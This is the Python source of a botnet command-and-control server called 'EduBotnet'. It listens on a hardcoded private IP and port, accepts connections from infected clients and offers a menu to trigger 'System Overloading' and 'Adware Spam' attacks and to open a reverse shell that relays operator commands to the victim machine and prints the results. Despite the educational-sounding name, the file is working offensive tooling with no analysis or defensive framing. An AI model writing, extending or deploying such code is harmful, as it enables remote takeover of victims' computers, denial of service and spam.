# Import the socket module for network communication
import socket

# Define the host and port for the server
host = "192.168.100.69"
port = 9999

# Create a socket object for TCP communication
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Lists to store connected clients and their addresses
all_connections = []
all_address = []

# Menu for the program
menu = """
╔══════════════════════════════════╗
║   EduBotnet - Menu               ║
╠══════════════════════════════════╣
║ 1. System Overloading            ║
║ 2. Adware Spam                   ║
║ 3. List Connections              ║
║ 4. Reverse Shell                 ║
║ 5. Quit                          ║
╚══════════════════════════════════╝
"""

# Function to list connected clients
def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        results += str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"
    print("----Clients----" + "\n" + results)
    return

# Function to handle incoming connections
def connected():
    # Bind the socket to the specified host and port
    s.bind((host, port))
    print("Server Listening...")
    s.listen(1)
    print(f"[*] Listening on {host}:{port}")

    # Close any existing connections and initialize the lists
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_address[:]

    # Continuously accept incoming connections
    while True:
        conn, addr = s.accept()
        all_connections.append(conn)
        all_address.append(addr)
        print(f"[*] Connection from: {addr[0]}:{addr[1]}")

        # Handle client menu interactions
        while True:
            print(menu)
            ans = input('Selection -> ')
            if ans == '1':
                conn.send(ans.encode())
                print("Attack launched successfully")
            elif ans == '2':
                conn.send(ans.encode())
                print("Attack launched successfully")
            elif ans == '3':
                list_connections()
            elif ans == '4':
                conn.send(ans.encode())
                while True:
                    command = input("shell> ")
                    if command == "exit":
                        conn.send(b"exit")
                        conn.close()
                        break
                    conn.send(command.encode())
                    response = conn.recv(20480).decode()
                    print(response)
            elif ans == '5':
                break
                exit()
            else:
                print('Invalid Input')

# Entry point of the program
if __name__ == '__main__':
    connected()
